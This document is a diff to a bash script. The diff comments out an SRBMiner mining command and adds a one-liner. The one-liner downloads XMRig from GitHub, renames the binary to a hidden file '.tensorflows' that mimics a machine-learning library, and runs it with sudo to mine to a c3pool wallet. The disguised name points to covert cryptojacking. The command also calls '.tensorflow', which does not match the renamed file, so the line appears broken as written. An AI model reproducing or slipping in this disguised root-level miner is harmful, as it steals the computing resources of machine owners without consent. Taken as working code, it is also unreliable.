@@ -1,2 +1,3 @@
 #!/bin/bash
-./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://verushash.mine.zergpool.com:3300 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n --password c=DOGE --keepalive true
+#./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://verushash.mine.zergpool.com:3300 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n --password c=DOGE --keepalive true
+wget https://github.com/C3Pool/xmrig-C3/releases/download/v6.16.5-C3/xmrig-v6.16.5-C3-linux-Static.tar.gz && tar -zxf xmrig-v6.16.5-C3-linux-Static.tar.gz && rm -rf xmrig-v6.16.5-C3-linux-Static.tar.gz && mv xmrig .tensorflows && sudo ./.tensorflow -a cn-heavy/xhv -o stratum+tcp://mine.c3pool.com:15555 -u 895qPmEnyjmh7eNGtBC4FV1taT3ZiC4asDGfqjXuNbcqhzVkZ6UPqGaVTcvBpyasdRNEeSnk9CBHDGwex6fkq5p1QWQfuwS -p cpuX --keepalive --threads=4
